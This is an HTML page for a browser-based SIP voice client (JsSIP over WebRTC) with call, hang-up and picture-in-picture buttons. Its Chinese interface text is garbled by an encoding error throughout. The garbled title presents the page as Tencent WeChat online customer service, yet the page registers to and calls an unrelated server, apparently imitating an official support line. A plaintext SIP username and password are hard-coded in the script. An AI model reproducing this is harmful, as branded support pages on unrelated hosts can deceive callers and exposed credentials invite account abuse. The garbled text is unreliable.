<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8" />
  <title>è…¾è®¯å¾®ä¿åœ¨çº¿å®¢æœ - ç”»ä¸­ç”»ç¤ºä¾‹</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f4ff;
      margin: 20px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    h1 {
      color: #1756a9;
      margin-bottom: 20px;
    }
    button {
      margin: 5px;
      padding: 12px 24px;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      color: white;
      background: #2685fa;
      transition: background 0.2s ease;
    }
    button:disabled {
      background: #a5c8f7;
      cursor: not-allowed;
    }
    #hangupButton {
      background: #ee4747;
    }
    #pipButton {
      background: #47b4ff;
    }
    #status {
      margin-top: 16px;
      font-size: 18px;
      color: #1756a9;
      min-height: 24px;
    }
    audio, video {
      margin-top: 12px;
      max-width: 100%;
      border: 1px solid #ccc;
      border-radius: 8px;
      display: none;
    }
  </style>
</head>
<body>
  <h1>è…¾è®¯å¾®ä¿åœ¨çº¿å®¢æœ</h1>

  <button id="callButton">ğŸ“ å‘¼å«å®¢æœ</button>
  <button id="hangupButton" disabled>ğŸ›‘ æŒ‚æ–­</button>
  <button id="pipButton" disabled>ğŸ–¼ï¸ å¼€å¯ç”»ä¸­ç”»</button>

  <div id="status">æœªå‘¼å«</div>

  <audio id="audioRemote" autoplay></audio>
  <video id="videoRemote" autoplay playsinline></video>

  <script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/jssip@3.0.10/dist/jssip.min.js"></script>
  <script>
    const callButton = document.getElementById('callButton');
    const hangupButton = document.getElementById('hangupButton');
    const pipButton = document.getElementById('pipButton');
    const statusDiv = document.getElementById('status');
    const remoteAudio = document.getElementById('audioRemote');
    const remoteVideo = document.getElementById('videoRemote');

    let ua = null;
    let session = null;
    let isCalling = false;

    // SIPè´¦å·é…ç½®ï¼Œæ›¿æ¢æˆä½ çš„
    const socket = new JsSIP.WebSocketInterface('wss://xin.anjre.cn:8089/ws');
    const configuration = {
      sockets: [socket],
      uri: 'sip:1002020@xin.anjre.cn',
      password: 'Aa6363463@',
      session_timers: false,
      register: true,
    };

    ua = new JsSIP.UA(configuration);

    ua.on('registered', () => {
      console.log('æ³¨å†ŒæˆåŠŸ');
      statusDiv.textContent = 'SIPæ³¨å†ŒæˆåŠŸï¼Œç­‰å¾…å‘¼å«';
      callButton.disabled = false;
    });
    ua.on('registrationFailed', (e) => {
      console.error('æ³¨å†Œå¤±è´¥', e);
      statusDiv.textContent = 'SIPæ³¨å†Œå¤±è´¥ï¼Œè¯·æ£€æŸ¥é…ç½®';
      callButton.disabled = true;
    });
    ua.on('disconnected', () => {
      console.warn('SIPè¿æ¥æ–­å¼€');
      statusDiv.textContent = 'SIPè¿æ¥æ–­å¼€';
      callButton.disabled = true;
      hangupButton.disabled = true;
      pipButton.disabled = true;
    });

    ua.start();

    callButton.onclick = () => {
      if (isCalling) return;
      isCalling = true;
      callButton.disabled = true;
      hangupButton.disabled = false;
      pipButton.disabled = true;
      statusDiv.textContent = 'æ­£åœ¨å‘¼å«å®¢æœ...';

      session = ua.call('sip:999999@xin.anjre.cn', {
        mediaConstraints: { audio: true, video: false },
        rtcOfferConstraints: {
          offerToReceiveAudio: 1,
          offerToReceiveVideo: 0
        }
      });

      session.connection.addEventListener('addstream', (event) => {
        const stream = event.stream;
        if (stream.getAudioTracks().length > 0) {
          remoteAudio.srcObject = stream;
          remoteAudio.style.display = 'block';
          remoteAudio.play().catch(e => console.warn('audio play fail:', e));
        }
        if (stream.getVideoTracks().length > 0) {
          remoteVideo.srcObject = stream;
          remoteVideo.style.display = 'block';
          pipButton.disabled = false;
        } else {
          pipButton.disabled = true;
          remoteVideo.style.display = 'none';
        }
      });

      session.on('progress', () => {
        statusDiv.textContent = 'ç­‰å¾…å®¢æœæ¥å¬...';
      });

      session.on('accepted', () => {
        statusDiv.textContent = 'å®¢æœé€šè¯ä¸­';
      });

      session.on('ended', () => {
        statusDiv.textContent = 'é€šè¯å·²ç»“æŸ';
        resetUI();
      });

      session.on('failed', (e) => {
        statusDiv.textContent = 'å‘¼å«å¤±è´¥';
        console.error('å‘¼å«å¤±è´¥:', e);
        resetUI();
      });
    };

    hangupButton.onclick = () => {
      if (session) session.terminate();
    };

    function resetUI() {
      isCalling = false;
      callButton.disabled = false;
      hangupButton.disabled = true;
      pipButton.disabled = true;
      remoteAudio.srcObject = null;
      remoteAudio.style.display = 'none';
      remoteVideo.srcObject = null;
      remoteVideo.style.display = 'none';
      session = null;
    }

    pipButton.onclick = async () => {
      if (!document.pictureInPictureEnabled) {
        alert('æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒç”»ä¸­ç”»');
        return;
      }
      if (!remoteVideo.srcObject || remoteVideo.srcObject.getVideoTracks().length === 0) {
        alert('å½“å‰é€šè¯æ²¡æœ‰è§†é¢‘è½¨é“ï¼Œæ— æ³•å¼€å¯ç”»ä¸­ç”»');
        return;
      }
      try {
        if (document.pictureInPictureElement) {
          await document.exitPictureInPicture();
          pipButton.textContent = 'ğŸ–¼ï¸ å¼€å¯ç”»ä¸­ç”»';
        } else {
          await remoteVideo.requestPictureInPicture();
          pipButton.textContent = 'ğŸ–¼ï¸ å…³é—­ç”»ä¸­ç”»';
        }
      } catch (error) {
        console.error('ç”»ä¸­ç”»åˆ‡æ¢å¤±è´¥:', error);
        alert('å¼€å¯ç”»ä¸­ç”»å¤±è´¥ï¼Œè¯·æ£€æŸ¥æµè§ˆå™¨æ”¯æŒåŠæƒé™');
      }
    };
  </script>
</body>
</html>
